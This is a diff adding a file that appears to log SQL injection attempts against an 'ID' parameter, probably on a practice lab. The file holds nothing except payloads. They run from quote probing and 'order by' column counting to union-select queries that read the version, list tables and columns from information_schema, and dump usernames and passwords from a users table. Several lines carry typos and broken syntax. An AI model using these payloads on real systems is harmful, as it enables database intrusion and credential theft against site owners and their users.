@@ -1,0 +1,116 @@
+ID:1'
+ID:1
+ID:2
+ID:3
+ID:2
+ID:1\
+ID:1'
+ID:1' --
+ID:1' -- 
+ID:1' order by 1-- 
+ID:1' order by 10-- 
+ID:1' order by 4-- 
+ID:1' order by 3-- 
+ID:1' union all select 1,2,3-- 
+ID:1' union all select 1,2,3-- 
+ID:1' union all select 1,2,3-- 
+ID:-1' union all select 1,2,3-- 
+ID:-1' union all select 1,version(),3-- 
+ID:-1' union all select 1,database(),3-- 
+ID:-1' union select 1,database(),3-- 
+ID:-1' union select 1,group_concat(table_name,'<br>'),3 from information_schema.tables where table_schema=database()-- 
+ID:-1' union select 1,group_concat(column_name,'<br>'),3 from information_schema.columns where table_name=users-- 
+ID:-1' union select 1,group_concat(column_name,'<br>'),3 from information_schema.columns where table_name='users'-- 
+ID:-1' union select 1,group_concat(id,'::',username,'::',password,'<br>'),3 from users-- 
+ID:-1' union select 1,group_concat('<br>',id,'::',username,'::',password),3 from users-- 
+ID:-1' union select 1,group_concat('<br>',id,'::',username,'::',password),3 from users-- 
+ID:-1' union select 1,database(),3-- 
+ID:-1' ; -- 
+ID:1
+ID:1'
+ID:1' --
+ID:1' -- 
+ID:1' order by 123--
+ID:1' order by 123-- 
+ID:1' order by 2-- 
+ID:1' order by 4-- 
+ID:1' order by 3-- 
+ID:1' union select 1,2,3-- 
+ID:-1' union select 1,2,3-- 
+ID:-1' union select 1,version(),database()-- 
+ID:-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- 
+ID:-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'-- 
+ID:-1' union select 1,2,group_concat(username,0x3a3a,password,'<br>') from users-- 
+ID:-1' union select 1,2,group_concat(username,0x3a3a,password,'<br>') from users limit 0,1-- 
+ID:-1' union select 1,2,group_concat(username,0x3a3a,password,'<br>') from users limit 2,1-- 
+ID:-1' union select 1,2,group_concat(username,0x3a3a,password,'<br>') from users limit 1,1-- 
+ID:-1' union select 1,2,group_concat(username,0x3a3a,password,'<br>') from users limit 0,1-- 
+ID:-1' union select 1,username,password  from users limit 0,1-- 
+ID:-1' union select 1,username,password  from users limit 2,1-- 
+ID:-1' union select 1,username,password  from users limit 1,1-- 
+ID:-1' union select 1,2,group_concat(USER,0x3a3a,CURRENT_CONNECTIONS,0x3a3a,TOTAL_CONNECTIONS,0x3a3a,id,0x3a3a,username,0x3a3a,password,'<br>') from users limit 0,1-- 
+ID:-1' union select 1,2,group_concat(USER,0x3a3a,CURRENT_CONNECTIONS,0x3a3a,TOTAL_CONNECTIONS,0x3a3a,id,0x3a3a,username,0x3a3a,password,'<br>') from users-- 
+ID:-1' union select 1,2,group_concat(USER,0x3a3a,CURRENT_CONNECTIONS,0x3a3a,TOTAL_CONNECTIONS,0x3a3a,id,0x3a3a,username,0x3a3a,password,'<br>') from users-- 
+ID:-1' union select 1,2,group_concat(USER,0x3a3a,TOTAL_CONNECTIONS,0x3a3a,id,0x3a3a,username,0x3a3a,password,'<br>') from users-- 
+ID:-1' union select 1,2,group_concat(USER,0x3a3a,TOTAL_CONNECTIONS,0x3a3a,id,0x3a3a,username,0x3a3a,password,'<br>') from users-- 
+ID:-1' union select 1,2,group_concat(TOTAL_CONNECTIONS,0x3a3a,id,0x3a3a,username,0x3a3a,password,'<br>') from users-- 
+ID:-1' union select 1,2,group_concat(id,0x3a3a,username,0x3a3a,password,'<br>') from users-- 
+ID:-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()-- 
+ID:-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema!=database()-- 
+ID:-1' union select 1,2,group_concat(table_schema,0x3a3a,column_name,) from information_schema.columns where table_name='users' and table_schema!=database()-- 
+ID:-1' union select 1,2,group_concat(table_schema) from information_schema.columns where table_name='users' and table_schema!=database()-- 
+ID:-1' union select 1,2,group_concat(table_name) from information_schema.columns where table_name='users' and table_schema!=database()-- 
+ID:-1' union select 1,version(),group_concat(table_name) from information_schema.columns where table_name='users' and table_schema!=database()-- 
+ID:1
+ID:1'
+ID:1' or '1
+ID:1' or '2
+ID:1' and '1
+ID:1' union select 1,2,3,4 and '1
+ID:1' union select 1,2,3 and '1
+ID:-1' union select 1,2,3 and '1
+ID:-1' union select 1,username,password from users and '1
+ID:-1' union select 1,username,password from users or '1
+ID:-1' union select 1,vesrion(),3 or '1
+ID:-1' union select 1,vesrion(),3 and '1
+ID:-1' union select 1,vesrion(),3 and '2
+ID:-1' union select 1,vesrion(),3 and '3
+ID:-1' union select 1,2,3 and '3
+ID:-1' union select 1,2,3 or'3
+ID:-1' union select 1,2,3 or '3
+ID:-1' union all select 1,2,3 or '3
+ID:-1' union all select 1,2,3 or '0
+ID:-1' union all select 1,2,3 and '0
+ID:-1' union all select 1,database(),3 and '0
+ID:-1' union select 1,database(),3 and '0
+ID:-1' union select 1,group_cancat(username,0x3a3a,password,'<br>'),3 from users and '0
+ID:-1' union select 1,group_cancat(username,0x3a3a,password,'<br>'),3 from users limit 0,1 and '0
+ID:-1' union select 1,group_cancat(table_name),3 from information_schema.tables where table_schema.database() limit 0,1 and '0
+ID:-1' union select 1,group_cancat(table_name),3 from information_schema.tables where table_schema.database() and '0
+ID:-1' union select 1,group_cancat(table_name),3 from information_schema.tables where table_schema.database() and '1
+ID:-1' union all select 2 , group_cancat(table_name), 3 from information_schema.tables where table_schema.database() and '1
+ID:-1' union all select 2 , group_cancat(table_name), 3 from information_schema.tables where table_schema.database() and '1--
+ID:-1' union select 1,vesrion(),3 --
+ID:-1' union select 1,vesrion(),3 -- 
+ID:-1'
+ID:-1
+ID:-1' union select 1,2,3--
+ID:-1' union select 1,2,3-- 
+ID:-1' union select 1,username,password from users-- 
+ID:-1' union select 1,username,password from users limit 1,1-- 
+ID:1'
+ID:5\
+ID:5\
+ID:5
+ID:1
+ID:1
+ID:1\
+ID:1\
+ID:1
+ID:1\
+ID:1\
+ID:1
+ID:1 order by 1223--
+ID:1 order by 1223-- 
+ID:1' order by 1223-- 
+ID:1' order by 1223-- 
